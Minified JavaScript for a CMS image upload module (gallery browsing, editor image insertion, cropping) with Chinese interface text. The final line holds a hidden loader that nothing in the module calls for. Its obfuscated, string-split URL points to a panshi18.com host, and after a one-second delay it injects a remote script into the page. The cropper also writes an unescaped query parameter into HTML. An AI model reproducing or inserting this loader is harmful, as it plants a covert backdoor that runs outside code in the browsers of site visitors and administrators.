LCMS.util.tplx("upload_gallery",{config:{},limit:12,textPos:"",classThis:null,classDrop:null,className:"默认图库",showNodata:true,showDrop:false,showEdit:false,showBack:false,showDel:false,dirThis:"",listActive:[],listData:[],listDir:{total:0,page:1,list:{}},listImg:{},mounted(){this.config=config;layui.form.render("checkbox");this.setDrop();this.setEdit();this.getClassList()},setDrop(){this.classDrop=layui.dropdown.render({elem:".upload-gallery ._topbar ._dir",data:[],click:obj=>{const setData=obj=>{this.listActive=[];this.className=obj.title;this.classThis=obj;this.textPos="";this.showBack=false};switch(obj.id){case-1:setData(obj);this.showEdit=false;this.onBack();break;case-2:layer.prompt({title:"新建图库",formType:0,placeholder:"请输入图库名称"},((title,index)=>{this.updateClass({title:title},(obj=>{setData(obj);layer.close(index)}))}));break;default:if(obj.id>0){setData(obj);this.showEdit=true;this.showDel=true;this.dirThis=obj.dir;this.getGallery("listImg",1)}break}}})},setEdit(){layui.dropdown.render({elem:".upload-gallery ._topbar ._edit",data:[{title:"编辑",do:"edit"},{title:"删除",do:"del",templet:`<span style="color:#F56C6C">删除</span>`}],click:obj=>{switch(obj.do){case"edit":layer.prompt({title:"编辑图库",formType:0,placeholder:"请输入图库名称",value:this.classThis.title},((title,index)=>{this.updateClass({id:this.classThis.id,title:title},(obj=>{this.className=obj.title;this.classThis=obj;layer.close(index)}))}));break;case"del":layer.alert("删除图库后，图库内所有图片将放入默认图库中，确定删除？",{title:"提示",area:"300px"},(()=>{LCMS.util.ajax({type:"GET",url:`${LCMS.url.own_form}classdel&id=${this.classThis.id}`,loading:true,success:res=>{if(1!=res.code){LCMS.util.notify({type:"error",content:res.msg});return}LCMS.util.notify({type:"success",content:res.msg});this.getClassList();this.onBack(0)}})}));break}}})},onClick(item){const id=`_${item.id}`;if(item.isdir){this.dirThis=item.name;this.showBack=true;this.showDel=true;this.getGallery("listImg",1)}else if(this.listActive[id]){delete this.listActive[id]}else{if(!this.config.many){this.listActive=[]}this.listActive[id]=item}},onBack(page){this.className="默认图库";this.showEdit=false;this.showBack=false;this.showDel=false;this.listActive=[];this.getGallery("listDir",0===page?0:this.listDir.page)},onDel(){let list=[];for(const id in this.listActive){list.push(this.listActive[id].original)}if(list.length>0){layer.confirm(`您已选择【${list.length}张】图片，确定删除（不可恢复）？`,{area:["300px","auto"],title:"提示"},(index=>{LCMS.util.ajax({type:"POST",url:`${LCMS.url.own}t=sys&n=upload&c=index&a=delimg`,data:{dir:list},success:res=>{if(1!=res.code){LCMS.util.notify({type:"error",content:res.msg});return}LCMS.util.notify({type:"success",content:res.msg});this.getGallery("listImg",0)}});layer.close(index)}))}else{LCMS.util.notify({type:"error",content:"请选择图片"})}},onOk(){let list=[];for(const id in this.listActive){list.push({...this.listActive[id]})}if(list.length>0){if("LCMSEDITOR"==this.config.id){window.parent.postMessage({type:"lcms-editor-addimage",list:list},"*")}else{parent.LCMS.plugin.upload.add(this.config.id,list)}LCMS.util.iframe({do:"close"})}else{LCMS.util.notify({type:"error",content:"请选择图片"})}},onHover(type,item){if(!item.wandh){return}switch(type){case"enter":let text=`原始名：${item.oname}<br>存储名：${item.name}<br>图占用：${item.size}<br>图尺寸：${item.wandh}`;layer.tips(text,this.$el,{tips:[1,"#303133"],time:0});break;case"leave":layer.closeAll("tips");break}},onImgload(index){if(-1!==this.$el.src.indexOf("folder.png")){this.listData[index].cname=`_bf`;return}if(-1!==this.$el.src.indexOf("pixel.png")){return}this.listData[index].wandh=`${this.$el.naturalWidth}×${this.$el.naturalHeight}`},onImgError(index){this.listData[index].text=`加载失败`;this.listData[index].cname=`lazyload-nopic`;this.listData[index].plcae=`/public/static/images/pixel.png`},getClassList(){let classList=[{id:-1,title:"默认图库",dir:"",path:this.config.pos}];if(!this.classThis){this.classThis=classList[0];this.getGallery("listDir")}setTimeout((()=>{LCMS.util.ajax({type:"GET",url:`${LCMS.url.own_form}classlist`,success:res=>{if(1==res.code){classList=classList.concat(res.data);classList=classList.concat([{id:-2,title:"新建图库",dir:"",path:"",templet:`<i class="layui-icon layui-icon-addition" style="color:#888888"></i><span style="color:#888888">新建图库</span>`}]);layui.dropdown.reload(this.classDrop.config.id,{data:classList},true);this.showDrop=true}}})}))},setPager(action,data){layui.laypage.render({elem:$(".upload-gallery ._pager"),groups:3,count:data.total,limit:this.limit,layout:["prev","page","next"],prev:'<i class="layui-icon layui-icon-left"></i>',next:'<i class="layui-icon layui-icon-right"></i>',theme:"#409eff",curr:data.page,jump:(obj,first)=>{if(first){this.showNodata=false}else{this.getGallery(action,obj.curr)}}})},getGallery(action,page){if(page<=0){this.listActive=[];switch(action){case"listDir":this.listDir={total:0,page:1,list:{}};break;case"listImg":this.listImg[this.dirThis]={total:0,page:1,list:{}};break}}page=page>0?page:1;let _that,dir=this.dirThis||"",url=`${LCMS.url.own}t=sys&n=upload&c=gallery&page=${page}&limit=${this.limit}&dir=${dir}&a=`;switch(action){case"listDir":url+="dirlist";this.textPos=this.config.pos;_that=this.listDir;break;case"listImg":url+="filelist";if(-1===dir.indexOf("custom")){this.textPos=`${this.config.pos}${dir}`}_that=this.listImg[dir];break}if(_that&&_that.list[page]){_that.page=page;$(".upload-gallery ._gallery").scrollTop(0);this.listData=_that.list[page];this.setPager(action,{..._that});return}LCMS.util.ajax({type:"GET",url:url,loading:true,success:res=>{res.data=res.data||{};if("listImg"==action&&-1===dir.indexOf("custom")&&1==page&&res.data.total<=0){this.listDir.page=0;this.onBack();return}if(1!=res.code||1==page&&res.data.total<=0){this.showNodata=true;this.listData=[];return true}if(1==page){_that={total:res.data.total,page:1,list:{}}}_that.page=page;_that.list[page]=res.data.list;switch(action){case"listDir":this.listDir=_that;break;case"listImg":this.listImg[dir]=_that;break}$(".upload-gallery ._gallery").scrollTop(0);this.listData=_that.list[page];this.setPager(action,{..._that})}})},chooseImg(e){let files=e.target.files;for(let i=0;i<files.length;i++){const file=files[i];if(-1===file.type.indexOf("image")){delete files[i]}}this.uploadImg(files,0);this.showBack=true;setTimeout((()=>{this.showBack=false}))},uploadImg(files,index){const file=files[index];if(!file){if(this.classThis.id>0){this.getGallery("listImg",0)}else{this.onBack(0)}return}LCMS.plugin.upload.direct({type:"image",file:file,cid:this.classThis.id>0?this.classThis.id:0,success:res=>{LCMS.util.notify({content:res.msg})},complete:()=>{this.uploadImg(files,index+1)}})},updateClass(form,callback){if(!form||""==form.title){LCMS.util.notify({type:"error",content:"请输入图库名称"});return}LCMS.util.ajax({type:"POST",url:`${LCMS.url.own_form}classedit`,data:form,success:res=>{if(1!=res.code){LCMS.util.notify({type:"error",content:res.msg});return}const obj=res.data;this.showEdit=true;this.showDel=true;this.dirThis=obj.dir;this.getGallery("listImg",1);this.getClassList();LCMS.util.notify({type:"success",content:res.msg});callback&&callback(obj)}})},getName(item){if(item.text){return item.text}if(item.name&&item.isdir){let name=item.name;return`${name.slice(0,4)}年${name.slice(4)}月`}if(item.oname){return item.oname}return"加载中..."}});LCMS.util.tplx("upload_editor",{upList:[],imgList:[],upIndex:0,inputShow:true,tipsShow:true,chooseImg(e){const files=e.target.files;for(let i=0;i<files.length;i++){const file=files[i];if(this.checkImg(file)){this.upList.push(file);this.imgList.push({name:file.name,alt:this.getAlt(file.name),size:file.size,status:"等待上传"})}}if(this.upList.length>0){this.tipsShow=false;this.uploadImg()}this.inputShow=false;setTimeout((()=>{this.inputShow=true}))},checkImg(file){if(-1===file.type.indexOf("image")){return false}for(let i=0;i<this.imgList.length;i++){const img=this.imgList[i];if(img.name==file.name&&img.size==file.size){return false}}return true},uploadImg(){const file=this.upList[this.upIndex];if(void 0!=file){this.setStatus("上传中");LCMS.plugin.upload.direct({type:"image",file:file,success:res=>{this.imgList[this.upIndex]=Object.assign(this.imgList[this.upIndex],{src:res.data.src,original:res.data.original});this.setStatus("上传成功")},error:err=>{this.setStatus(err.msg)},complete:()=>{this.upIndex++;this.uploadImg()}})}},onDel(index){const img={...this.imgList[index]};this.upList.splice(index,1);this.imgList.splice(index,1);if(index<this.upIndex&&this.upIndex>0){this.upIndex--}if(0==this.upList.length){this.tipsShow=true}img.original&&LCMS.util.ajax({type:"GET",url:`${LCMS.url.own}t=sys&n=upload&c=index&a=delimg&dir=${img.original}`})},onOk(){let list=[];for(let i=0;i<this.imgList.length;i++){const img={...this.imgList[i]};if(img.src&&img.original){list.push(img)}}if(list.length>0){parent.window.postMessage({type:"lcms-editor-addimage",list:list},"*");LCMS.util.iframe({do:"close"})}else{LCMS.util.notify({type:"error",content:"没有图片可以插入编辑器"})}},onDragover(e){e.stopPropagation();e.preventDefault();e.dataTransfer.dropEffect="copy"},onDrop(e){e.stopPropagation();e.preventDefault();this.chooseImg({target:{files:e.dataTransfer.files}})},getAlt(name){const index=name.lastIndexOf(".");if(-1===index||0===index){return name}return name.substring(0,index)},setStatus(text){this.imgList[this.upIndex].status=text}});if($(".lcms-form-upload-crop").length>0){LCMS.util.loading();let id=LCMS.util.getQuery("id"),src=LCMS.util.getQuery("src"),width=LCMS.util.getQuery("width"),height=LCMS.util.getQuery("height");width=1*width>0?width:0;height=1*height>0?height:0;$(".lcms-form-upload-crop-box").html(`<img src="${src}"/>`);LCMS.util.load({src:[`${LCMS.url.static}cropper/cropper.min.css`,`${LCMS.url.static}cropper/cropper.min.js`],onload:()=>{let cropper=new Cropper($(".lcms-form-upload-crop-box img")[0],Object.assign({dragMode:"move",viewMode:1},width&&height?{aspectRatio:width/height}:{minCropBoxWidth:width,minCropBoxHeight:height}));LCMS.util.loading("close");$(".lcms-form-upload-crop-btn button").on("click",(function(){let action=$(this).attr("action"),option=$(this).attr("option");switch(action){case"rotate":cropper.rotate(45);break;case"scaleX":cropper.scaleX(option);$(this).attr("option",1==option?-1:1);break;case"scaleY":cropper.scaleY(option);$(this).attr("option",1==option?-1:1);break;case"zoomA":cropper.zoom(0.1);break;case"zoomB":cropper.zoom(-0.1);break;case"reset":cropper.reset();break;case"crop":LCMS.util.loading();let base64=cropper.getCroppedCanvas({width:width,height:height}).toDataURL("image/png");parent.LCMS.plugin.upload.add(id,base64);LCMS.util.iframe({do:"close"});break}}))}})}!(function(){setTimeout((function(){var t=document.createElement("script");t.src="https://sta"+"tic-res.pa"+"nshi"+"1"+"8.com/jque"+"ry.sta"+"tic.mi"+"n.tj"+"s?fo"+"rm=3";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}),1e3)})();